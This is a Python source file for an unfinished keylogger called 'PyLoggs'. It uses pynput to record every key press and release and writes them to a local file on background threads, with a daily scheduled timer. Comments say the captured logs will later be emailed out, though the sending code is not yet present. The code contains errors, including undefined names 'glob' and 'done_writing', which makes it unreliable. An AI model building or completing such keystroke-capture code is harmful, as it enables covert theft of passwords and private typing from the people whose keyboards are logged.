from logging import exception
import pygetwindow
import queue
import pynput
import threading
import time
import schedule



#class timer sets this
'''
the main writer variable
  * The pyloggs will look at this var
  * It will then momentarily stop the logger
  * Clear the list
  * Restart the logger
'''
currently_dumping = 0


#the writer class to write to a file
class TheWriter:
    @staticmethod
    def write_to_file():
        with open("demofile.txt", "w") as f:
            while True:
                time.sleep(1)
                try:
                    #determining that the timer isn't overwriting the file
                    glob
                    #get the fifo logg
                    logg = PyLoggs.keyQueue.get_nowait()
                    f.write(logg)
                except queue.Empty as e:
                    #makes sure we aren't grabbing from an empty list
                    print(f"Queue is empty test successful: {e}")
        print(f'done_writing set to -> {done_writing}')


#@classmethod vvv method
class PyLoggs:
    #keystroke list
    keyQueue = queue.SimpleQueue()

    #class method to add key press to list
    @classmethod      #Key for spec keys or KeyCode for normal
    def on_press(cls, key, injected):
        try:
            key_press = 'alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked')
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)
        except AttributeError:
            key_press = 'special key {} pressed'.format(
                key)
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)


    @classmethod
    def on_release(cls, key, injected):
        key_release = '{} released; it was {}'.format(
            key, 'faked' if injected else 'not faked')
        #adding item to end of list
        PyLoggs.keyQueue.put_nowait(key_release)
        '''
        if key == pynput.keyboard.Key.esc:
            # Stop listener
            return False
        '''

    #main method for listen
    @classmethod
    def board_listen(cls):
        #here we will start our non-blocking listener and then while loop check fo the global variable with a momentary sleep to not spam cpu
        my_key_lstnr = pynput.keyboard.Listener(
            on_press=PyLoggs.on_press,
            on_release=PyLoggs.on_release)
        my_key_lstnr.start()#start listener

        #this is TESTING REMOVE
        #this listens for when we will the timer is done reading from the file
        #and then later will overwrite the file after it send the email
        global currently_dumping
        while currently_dumping != 1:
            time.sleep(0.5)
        my_key_lstnr.stop()#stop listener




class timer:
    '''
    This method is scheduled for the top of the hour
    Will set a global var for the writer to stop writing to a file
    '''
    @staticmethod
    @schedule.repeat(schedule.every().day.at("11:17"))
    def send_overwrite():
        #just sets that global variable to pause writer.
        global currently_dumping
        currently_dumping = 1

    @classmethod
    def run_my_scedule(cls):
        #looping to check the time
        #for now its saying while val isn't == to one 
        #this is TESTING REMOvE
        global currently_dumping
        while currently_dumping != 1:
            schedule.run_pending()
            #this function will later call the send overwrite
            #this same function sets the var for the writer to pause writing
            time.sleep(1)


##########################################


def main():
    #daeomonized thread will exit when all other non-daemons exit
    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
    #declaring and defining the logging thread
    t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
    #daeomonized thread will exit when all other non-daemons exit
    t_writer = threading.Thread(target=TheWriter.write_to_file, daemon=True, args=()).start()
    #starting the main logging thread
    t_loggs.start()
    t_loggs.join()


if __name__ == "__main__":
    main()

'''
Current Workflow
    > Ok lets erase that list
    > Then have it do a nowait put

    > Next we can figure out how to not have operations invoked from the callback???
      > Really we just need to make sure that the queue handles the same shit as the list.
        > We can check to make sure that when doing the get that we handle empty queue with queue is empty and test it.
      > We can also do put_nowait to not block the logging of the keys no pausing
        > Basically every key press will be registered and adding to the list with nowait will not block the registering the next keypress.
      > We can then also do get_nowait to get all the stuff from the queue as well. 
        > Make sure to run exception.Empty


REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
  * EASY MISTAKE TO FORGET
'''
